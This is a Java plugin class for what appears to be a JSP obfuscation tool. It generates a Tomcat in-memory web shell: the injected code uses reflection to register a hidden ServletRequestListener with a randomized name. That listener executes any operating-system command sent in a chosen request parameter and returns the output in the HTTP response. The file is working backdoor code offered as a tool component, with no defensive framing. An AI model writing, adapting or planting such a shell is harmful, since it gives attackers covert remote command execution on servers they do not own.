package com.t3stzer0.jspobfuscator.plugins.extensions.Gadget;

import com.t3stzer0.jspobfuscator.api.plugin.context.ExtensionContext;
import com.t3stzer0.jspobfuscator.api.plugin.gadget.GadgetExtension;
import com.t3stzer0.jspobfuscator.plugins.common.utils.random.RandomGenerator;
import org.pf4j.Extension;

import java.util.List;

@Extension
public class MemShellListener implements GadgetExtension {
  @Override
  public List<String> getCode(ExtensionContext ctx) {
    return List.of(
        String.format(
"""
Field reqF = request.getClass().getDeclaredField("request");
reqF.setAccessible(true);
StandardContext context = (StandardContext) ((Request) reqF.get(request)).getContext();
context.addApplicationEventListener(new %s());
""",
            getClassName(ctx)));
  }

  private String getClassName(ExtensionContext ctx) {
    RandomGenerator rng = new RandomGenerator(ctx.getRandomSeed());
    return "" + rng.nextChar() + rng.nextChar() + rng.nextDigitChar();
  }

  @Override
  public List<String> getDeclaration(ExtensionContext ctx) {
    String cmd = ctx.getStringInput("cmdParameter");
    return List.of(
        String.format(
"""
public class %s implements ServletRequestListener {
    public void requestDestroyed(ServletRequestEvent sre) { }
    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
        String cmd = req.getParameter("%s");
        if (cmd != null) {
            try {
                java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
                byte[] b = new byte[2048];
                Field requestF = req.getClass().getDeclaredField("request");
                requestF.setAccessible(true);
                Request request = (Request)requestF.get(req);
                int len;
                while( (len = in.read(b))!=-1){
                    request.getResponse().getWriter().write(new String(b, 0, len));
                }
            } catch (Exception e) { }
        }
    }
}
""",
            getClassName(ctx), cmd));
  }

  @Override
  public List<String> getImports(ExtensionContext ctx) {
    return List.of(
        "org.apache.catalina.core.StandardContext",
        "java.lang.reflect.Field",
        "org.apache.catalina.connector.Request");
  }

  @Override
  public void initExtension(ExtensionContext ctx) {
    ctx.registerStringInput("cmdParameter", true, "cmd");
  }

  @Override
  public String getHelp() {
    return GadgetExtension.super.getHelp();
  }
}
